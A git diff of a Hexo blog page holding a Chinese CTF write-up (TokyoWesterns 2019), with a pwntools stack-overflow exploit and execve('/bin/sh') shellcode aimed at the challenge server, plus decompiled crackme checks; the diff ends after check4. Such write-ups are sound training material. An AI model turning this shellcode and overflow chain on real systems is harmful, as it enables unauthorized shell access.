@@ -1,124 +1,342 @@
-<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="pumpkin9"><meta name="renderer" content="webkit"><meta name="copyright" content="pumpkin9"><meta name="keywords" content="pumpkin9"><meta name="description" content="null"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>TokyoWesternsCTF 2019 writeup · pumpkin9's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
-  "use strict";
-  // rel=preload support test
-  if( !w.loadCSS ){
-    w.loadCSS = function(){};
-  }
-  // define on the loadCSS obj
-  var rp = loadCSS.relpreload = {};
-  // rel=preload feature support test
-  // runs once and returns a function for compat purposes
-  rp.support = (function(){
-    var ret;
-    try {
-      ret = w.document.createElement( "link" ).relList.supports( "preload" );
-    } catch (e) {
-      ret = false;
-    }
-    return function(){
-      return ret;
-    };
-  })();
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+      <script>
+  var _hmt = _hmt || []
+  ;(function() {
+    var hm = document.createElement('script')
+    hm.src = 'https://hm.baidu.com/hm.js?5a0acc897fd96474a2c8f4deac84611a'
+    var s = document.getElementsByTagName('script')[0]
+    s.parentNode.insertBefore(hm, s)
+  })()
+</script> 
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content>
+    <meta name="description" content>
+    
+    <title>
+      TokyoWesternsCTF 2019 writeup - pumpkin9
+    </title>
+    <link rel="manifest" href="/manifest.json">
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/style/style.css">
+  </head>
+  <body>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup"><span class="toc-text">warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-crackme"><span class="toc-text">easy_crackme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#check1"><span class="toc-text">check1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check2"><span class="toc-text">check2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check3"><span class="toc-text">check3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check4"><span class="toc-text">check4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check5"><span class="toc-text">check5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check6"><span class="toc-text">check6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#real-baby-rsa"><span class="toc-text">real baby rsa</span></a></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search">
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg">
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="/" class>
+          Home
+        </a>
+        
+        <a href="/archives" class>
+          Archives
+        </a>
+        
+        <a href="/categories" class>
+          Categories
+        </a>
+        
+        <a href="/tags" class>
+          Tags
+        </a>
+        
+        <a href="/friends" class>
+          Friends
+        </a>
+        
+        <a href="/about" class>
+          About
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author">pumpkin9</div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author">pumpkin9</div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
 
-  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
-  // then change that media back to its intended value on load
-  rp.bindMediaToggle = function( link ){
-    // remember existing media attr for ultimate state, or default to 'all'
-    var finalMedia = link.media || "all";
+        <div class="nav">
+          
+          <a href="/" class>
+            Home
+          </a>
+          
+          <a href="/archives" class>
+            Archives
+          </a>
+          
+          <a href="/categories" class>
+            Categories
+          </a>
+          
+          <a href="/tags" class>
+            Tags
+          </a>
+          
+          <a href="/friends" class>
+            Friends
+          </a>
+          
+          <a href="/about" class>
+            About
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com/shixiaohu2206" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+            
+            <a href="https://www.facebook.com/shi.xiaohu.5" target="_block">
+              <span class="iconfont icon-facebook"></span>
+            </a>
+            
+            <a href="https://www.instagram.com/shi_xiaohu/" target="_block">
+              <span class="iconfont icon-instagram"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">TokyoWesternsCTF 2019 writeup</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2019/09/02</span>
+        </span>
 
-    function enableStylesheet(){
-      link.media = finalMedia;
-    }
+        
 
-    // bind load handlers to enable media
-    if( link.addEventListener ){
-      link.addEventListener( "load", enableStylesheet );
-    } else if( link.attachEvent ){
-      link.attachEvent( "onload", enableStylesheet );
-    }
-
-    // Set rel and non-applicable media type to start an async request
-    // note: timeout allows this to happen async to let rendering continue in IE
-    setTimeout(function(){
-      link.rel = "stylesheet";
-      link.media = "only x";
-    });
-    // also enable media after 3 seconds,
-    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
-    setTimeout( enableStylesheet, 3000 );
-  };
-
-  // loop through link elements in DOM
-  rp.poly = function(){
-    // double check this to prevent external calls from running
-    if( rp.support() ){
-      return;
-    }
-    var links = w.document.getElementsByTagName( "link" );
-    for( var i = 0; i < links.length; i++ ){
-      var link = links[ i ];
-      // qualify links to those with rel=preload and as=style attrs
-      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
-        // prevent rerunning on link
-        link.setAttribute( "data-loadcss", true );
-        // bind listeners to toggle media back
-        rp.bindMediaToggle( link );
-      }
-    }
-  };
-
-  // if unsupported, run the polyfill
-  if( !rp.support() ){
-    // run once at least
-    rp.poly();
-
-    // rerun poly on an interval until onload
-    var run = w.setInterval( rp.poly, 500 );
-    if( w.addEventListener ){
-      w.addEventListener( "load", function(){
-        rp.poly();
-        w.clearInterval( run );
-      } );
-    } else if( w.attachEvent ){
-      w.attachEvent( "onload", function(){
-        rp.poly();
-        w.clearInterval( run );
-      } );
-    }
-  }
-
-
-  // commonjs
-  if( typeof exports !== "undefined" ){
-    exports.loadCSS = loadCSS;
-  }
-  else {
-    w.loadCSS = loadCSS;
-  }
-}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
-  i.fa.fa-comment
-  .saying--><div class="cxo-profile-inner"><div class="profile-name">pumpkin9</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/archives/">你不关注花，花永远只是花</a></div><div class="intro-nav-label-box"><a href="/archives/">Home</a><a href="/about/">About</a><a href="/categories/">Category</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/archives/">Home</a><a href="/about/">About</a><a href="/categories/">Category</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">TokyoWesternsCTF 2019 writeup</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-09-02</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="write up"> write up</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><p>tcl 做了三道签到题目</p>
-<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>没有任何保护的栈溢出</p>
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/CTF">CTF</a>
+                
+              
+          </span>
+        </span>
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/write up">write up</a>
+                  
+                
+            </span>
+          </span>
+         
+      </div>
+      <div>
+      </div>
+    </div>
+    <p>tcl 做了三道签到题目</p>
+<h2 id="warmup">warmup<a class="post-anchor" href="#warmup"></a></h2><p>没有任何保护的栈溢出</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">addr=<span class="number">0x0000000000601A00</span></span><br><span class="line"></span><br><span class="line">buf=<span class="number">0x00007FFE0740F240</span></span><br><span class="line">ret=<span class="number">0x00007FFE0740F348</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process('./pwn')</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io=remote(<span class="string">'nothing.chal.ctf.westerns.tokyo'</span>,<span class="number">10001</span>)</span><br><span class="line">io.sendline((ret-buf)*<span class="string">'a'</span>+p64(<span class="number">0x0000000000400773</span>)+p64(addr)+p64(elf.plt[<span class="string">'gets'</span>])+p64(addr))</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="easy-crackme"><a href="#easy-crackme" class="headerlink" title="easy_crackme"></a>easy_crackme</h2><p>这道题目耗时间比较长<br>最后用z3 一个一个进行约束即可</p>
-<h3 id="check1"><a href="#check1" class="headerlink" title="check1"></a>check1</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v46 = '76543210';</span><br><span class="line">v47 = 'fedcba98';</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="built_in">strchr</span>(s, *((<span class="keyword">char</span> *)&amp;v46 + i)); j; j = <span class="built_in">strchr</span>(j + <span class="number">1</span>, *((<span class="keyword">char</span> *)&amp;v46 + i)) )</span><br><span class="line">    ++*((_DWORD *)&amp;s1 + i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;s1, &amp;unk_400F00, <span class="number">0x40</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="easy-crackme">easy_crackme<a class="post-anchor" href="#easy-crackme"></a></h2><p>这道题目耗时间比较长<br>最后用z3 一个一个进行约束即可</p>
+<h3 id="check1">check1<a class="post-anchor" href="#check1"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v46 = '76543210';</span><br><span class="line">v47 = 'fedcba98';</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="built_in">strchr</span>(s, *((<span class="keyword">char</span> *)&amp;v46 + i)); j; j = <span class="built_in">strchr</span>(j + <span class="number">1</span>, *((<span class="keyword">char</span> *)&amp;v46 + i)) )</span><br><span class="line">    ++*((_DWORD *)&amp;s1 + i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;s1, &amp;unk_400F00, <span class="number">0x40</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>判断字符出现次数</p>
-<h3 id="check2"><a href="#check2" class="headerlink" title="check2"></a>check2</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">v21 = <span class="number">0L</span>L;</span><br><span class="line">    v22 = <span class="number">0L</span>L;</span><br><span class="line">    v23 = <span class="number">0L</span>L;</span><br><span class="line">    v24 = <span class="number">0L</span>L;</span><br><span class="line">    v25 = <span class="number">0L</span>L;</span><br><span class="line">    v26 = <span class="number">0L</span>L;</span><br><span class="line">    v27 = <span class="number">0L</span>L;</span><br><span class="line">    v28 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">7</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">0</span>;</span><br><span class="line">      v11 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">3</span>; ++l )                <span class="comment">// 遍历 &#123;***&#125; 的内容</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5 = s[<span class="number">4</span> * k + <span class="number">6</span> + l];</span><br><span class="line">        v10 += v5;</span><br><span class="line">        v11 ^= v5;</span><br><span class="line">      &#125;</span><br><span class="line">      *((_DWORD *)&amp;v21 + k) = v10;              <span class="comment">// 四个一组的和</span></span><br><span class="line">      *((_DWORD *)&amp;v25 + k) = v11;              <span class="comment">// 四个一组异或的值</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="check2">check2<a class="post-anchor" href="#check2"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">v21 = <span class="number">0L</span>L;</span><br><span class="line">    v22 = <span class="number">0L</span>L;</span><br><span class="line">    v23 = <span class="number">0L</span>L;</span><br><span class="line">    v24 = <span class="number">0L</span>L;</span><br><span class="line">    v25 = <span class="number">0L</span>L;</span><br><span class="line">    v26 = <span class="number">0L</span>L;</span><br><span class="line">    v27 = <span class="number">0L</span>L;</span><br><span class="line">    v28 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">7</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">0</span>;</span><br><span class="line">      v11 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">3</span>; ++l )                <span class="comment">// 遍历 &#123;***&#125; 的内容</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5 = s[<span class="number">4</span> * k + <span class="number">6</span> + l];</span><br><span class="line">        v10 += v5;</span><br><span class="line">        v11 ^= v5;</span><br><span class="line">      &#125;</span><br><span class="line">      *((_DWORD *)&amp;v21 + k) = v10;              <span class="comment">// 四个一组的和</span></span><br><span class="line">      *((_DWORD *)&amp;v25 + k) = v11;              <span class="comment">// 四个一组异或的值</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="check3"><a href="#check3" class="headerlink" title="check3"></a>check3</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">v29 = <span class="number">0L</span>L;</span><br><span class="line">v30 = <span class="number">0L</span>L;</span><br><span class="line">v31 = <span class="number">0L</span>L;</span><br><span class="line">v32 = <span class="number">0L</span>L;</span><br><span class="line">v33 = <span class="number">0L</span>L;</span><br><span class="line">v34 = <span class="number">0L</span>L;</span><br><span class="line">v35 = <span class="number">0L</span>L;</span><br><span class="line">v36 = <span class="number">0L</span>L;</span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">7</span>; ++m )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">3</span>; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = s[<span class="number">8</span> * n + <span class="number">6</span> + m];</span><br><span class="line">    v14 += v6;</span><br><span class="line">    v15 ^= v6;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_DWORD *)&amp;v29 + m) = v14;</span><br><span class="line">  *((_DWORD *)&amp;v33 + m) = v15;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;v21, &amp;unk_400F40, <span class="number">0x20</span>uLL) || <span class="built_in">memcmp</span>(&amp;v25, &amp;unk_400F60, <span class="number">0x20</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;v29, &amp;unk_400FA0, <span class="number">0x20</span>uLL) || <span class="built_in">memcmp</span>(&amp;v33, &amp;unk_400F80, <span class="number">0x20</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="check3">check3<a class="post-anchor" href="#check3"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">v29 = <span class="number">0L</span>L;</span><br><span class="line">v30 = <span class="number">0L</span>L;</span><br><span class="line">v31 = <span class="number">0L</span>L;</span><br><span class="line">v32 = <span class="number">0L</span>L;</span><br><span class="line">v33 = <span class="number">0L</span>L;</span><br><span class="line">v34 = <span class="number">0L</span>L;</span><br><span class="line">v35 = <span class="number">0L</span>L;</span><br><span class="line">v36 = <span class="number">0L</span>L;</span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">7</span>; ++m )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">3</span>; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = s[<span class="number">8</span> * n + <span class="number">6</span> + m];</span><br><span class="line">    v14 += v6;</span><br><span class="line">    v15 ^= v6;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_DWORD *)&amp;v29 + m) = v14;</span><br><span class="line">  *((_DWORD *)&amp;v33 + m) = v15;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;v21, &amp;unk_400F40, <span class="number">0x20</span>uLL) || <span class="built_in">memcmp</span>(&amp;v25, &amp;unk_400F60, <span class="number">0x20</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;v29, &amp;unk_400FA0, <span class="number">0x20</span>uLL) || <span class="built_in">memcmp</span>(&amp;v33, &amp;unk_400F80, <span class="number">0x20</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="check4"><a href="#check4" class="headerlink" title="check4"></a>check4</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(v45, <span class="number">0</span>, <span class="keyword">sizeof</span>(v45));</span><br><span class="line"><span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">31</span>; ++ii )</span><br><span class="line">&#123;</span><br><span class="line">  v7 = s[ii + <span class="number">6</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v7 &lt;= <span class="number">0x2F</span> || v7 &gt; <span class="number">0x39</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0x60</span> || v7 &gt; <span class="number">0x66</span> )</span><br><span class="line">      v45[ii] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v45[ii] = <span class="number">0x80</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v45[ii] = <span class="number">0xFF</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v45, &amp;unk_400FC0, <span class="number">0x80</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="check4">check4<a class="post-anchor" href="#check4"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(v45, <span class="number">0</span>, <span class="keyword">sizeof</span>(v45));</span><br><span class="line"><span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">31</span>; ++ii )</span><br><span class="line">&#123;</span><br><span class="line">  v7 = s[ii + <span class="number">6</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v7 &lt;= <span class="number">0x2F</span> || v7 &gt; <span class="number">0x39</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0x60</span> || v7 &gt; <span class="number">0x66</span> )</span><br><span class="line">      v45[ii] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v45[ii] = <span class="number">0x80</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v45[ii] = <span class="number">0xFF</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v45, &amp;unk_400FC0, <span class="number">0x80</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
